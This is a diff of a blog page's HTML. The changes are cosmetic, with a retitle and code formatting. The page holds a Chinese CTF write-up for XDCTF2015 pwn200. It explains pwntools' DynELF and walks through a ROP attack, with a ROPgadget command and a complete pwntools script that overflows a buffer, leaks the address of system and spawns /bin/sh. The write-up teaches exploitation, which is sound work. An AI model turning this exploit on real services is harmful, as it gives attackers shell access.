@@ -108,17 +108,17 @@
 
 
 
-  <meta name="description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
+  <meta name="description" content="该题用到了 DynELF 技术   DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&apos;./xxx&apos;)def leak(address):  #各种预处理  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;  p.send(payload)  #各种处理  da">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XDCTF2015-pwn200(DynELF)">
+<meta property="og:title" content="CTF | XDCTF2015-pwn200(DynELF)">
 <meta property="og:url" content="https://yuuoniy.github.io/2018/03/18/XDCTF2015-pwn200/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
-<meta property="og:updated_time" content="2018-03-30T03:07:59.463Z">
+<meta property="og:description" content="该题用到了 DynELF 技术   DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&apos;./xxx&apos;)def leak(address):  #各种预处理  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;  p.send(payload)  #各种处理  da">
+<meta property="og:updated_time" content="2018-09-18T07:48:07.240Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XDCTF2015-pwn200(DynELF)">
-<meta name="twitter:description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
+<meta name="twitter:title" content="CTF | XDCTF2015-pwn200(DynELF)">
+<meta name="twitter:description" content="该题用到了 DynELF 技术   DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&apos;./xxx&apos;)def leak(address):  #各种预处理  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;  p.send(payload)  #各种处理  da">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>XDCTF2015-pwn200(DynELF) | 尿尿</title>
+  <title>CTF | XDCTF2015-pwn200(DynELF) | 尿尿</title>
   
 
 
@@ -343,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XDCTF2015-pwn200(DynELF)
+          <h1 class="post-title" itemprop="name headline">CTF | XDCTF2015-pwn200(DynELF)
               
             
           </h1>
@@ -385,7 +385,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-03-30 11:07:59" itemprop="dateModified" datetime="2018-03-30T11:07:59+08:00">2018-03-30</time>
+                <time title="Modified: 2018-09-18 15:48:07" itemprop="dateModified" datetime="2018-09-18T15:48:07+08:00">2018-09-18</time>
               
             
           </span>
@@ -410,7 +410,7 @@
 
           
           
-             <span id="/2018/03/18/XDCTF2015-pwn200/" class="leancloud_visitors" data-flag-title="XDCTF2015-pwn200(DynELF)">
+             <span id="/2018/03/18/XDCTF2015-pwn200/" class="leancloud_visitors" data-flag-title="CTF | XDCTF2015-pwn200(DynELF)">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">1.6k</span>
+                <span title="Symbols count in article">1.5k</span>
               
 
               
@@ -469,12 +469,12 @@
       
 
       
-        <p>该题用到了 DynELF 技术  </p>
-<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(&apos;./xxx&apos;)</div><div class="line">def leak(address):</div><div class="line">  #各种预处理</div><div class="line">  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</div><div class="line">  p.send(payload)</div><div class="line">  #各种处理</div><div class="line">  data = p.recv(4)</div><div class="line">  return data</div><div class="line">d = DynELF(leak, elf=ELF(&quot;./xxx&quot;))      #初始化DynELF模块 </div><div class="line">systemAddress = d.lookup(&apos;system&apos;, &apos;libc&apos;)  #在libc文件中搜索system函数的地址</div></pre></td></tr></table></figure></p>
-<p>再看read 函数：<br>定义函数：ssize_t read(int fd, void * buf, size_t count);<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  </p>
-<p>思路：<br>1.调用main函数循环利用<br>2.泄露出system地址<br>3.写入”/bin/sh”<br>4.调用system获取shell，在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress。保证堆栈平衡</p>
+        <p>该题用到了 <code>DynELF</code> 技术  </p>
+<p><code>DynELF</code> 是 <code>pwntools</code> 中专门用来应对无 <code>libc</code> 情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./xxx'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">  <span class="comment">#各种预处理</span></div><div class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></div><div class="line">  p.send(payload)</div><div class="line">  <span class="comment">#各种处理</span></div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  <span class="keyword">return</span> data</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></div><div class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></div></pre></td></tr></table></figure></p>
+<p>再看 <code>read</code> 函数：<br>定义函数：<code>ssize_t read(int fd, void * buf, size_t count);</code><br>函数说明：<code>read()</code>会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数 <code>count</code> 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  </p>
+<p>思路：<br>1.调用 <code>main</code> 函数循环利用<br>2.泄露出 <code>system</code> 地址<br>3.写入<code>”/bin/sh”</code><br>4.调用 <code>system</code> 获取 <code>shell</code> ，在实际调用 <code>system</code> 前，需要通过三次 <code>pop</code> 操作来将栈指针指向 <code>systemAddress</code> 。保证堆栈平衡</p>
 <p>查找gadget：<br><code>ROPgadget --binary pwn200 --only &quot;pop|ret&quot;</code><br>使用：<br><code>0x08048649 : pop esi ; pop edi ; pop ebp ; ret</code>   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;./pwn200&apos;)</div><div class="line">io = process(&apos;./pwn200&apos;)</div><div class="line">write_plt = elf.plt[&apos;write&apos;] # symbols 也可以</div><div class="line">read_plt = elf.plt[&apos;read&apos;]</div><div class="line">main_addr = 0x80483e0 </div><div class="line">bss_addr = elf.bss() #用来存储&apos;/bin/sh&apos;</div><div class="line">pppr = 0x08048649 </div><div class="line"></div><div class="line">def leak(addr):</div><div class="line">    io.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</div><div class="line">    payload = &apos;a&apos;*112+p32(write_plt)+p32(main_addr)+p32(1)+p32(addr)+p32(4)</div><div class="line">    io.sendline(payload)</div><div class="line">    msg = io.recv(4)</div><div class="line">    return msg</div><div class="line"></div><div class="line">dyn = DynELF(leak,elf=elf)  </div><div class="line">sys_addr = dyn.lookup(&apos;system&apos;,&apos;libc&apos;)</div><div class="line">payload = &apos;a&apos;*112+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</div><div class="line">io.sendline(payload)</div><div class="line">io.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'./pwn200'</span>)</div><div class="line">io = process(<span class="string">'./pwn200'</span>)</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>] <span class="comment"># symbols 也可以</span></div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">main_addr = <span class="number">0x80483e0</span> </div><div class="line">bss_addr = elf.bss() <span class="comment">#用来存储'/bin/sh'</span></div><div class="line">pppr = <span class="number">0x08048649</span> </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</div><div class="line">    payload = <span class="string">'a'</span>*<span class="number">112</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)</div><div class="line">    io.sendline(payload)</div><div class="line">    msg = io.recv(<span class="number">4</span>)</div><div class="line">    <span class="keyword">return</span> msg</div><div class="line"></div><div class="line">dyn = DynELF(leak,elf=elf)  </div><div class="line">sys_addr = dyn.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">112</span>+p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</div><div class="line">io.sendline(payload)</div><div class="line">io.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -595,7 +595,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-count">64</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -895,7 +895,7 @@
       var disqus_config = function () {
         this.page.url = 'https://yuuoniy.github.io/2018/03/18/XDCTF2015-pwn200/';
         this.page.identifier = '2018/03/18/XDCTF2015-pwn200/';
-        this.page.title = 'XDCTF2015-pwn200(DynELF)';
+        this.page.title = 'CTF | XDCTF2015-pwn200(DynELF)';
         };
       function loadComments () {
         var d = document, s = d.createElement('script');
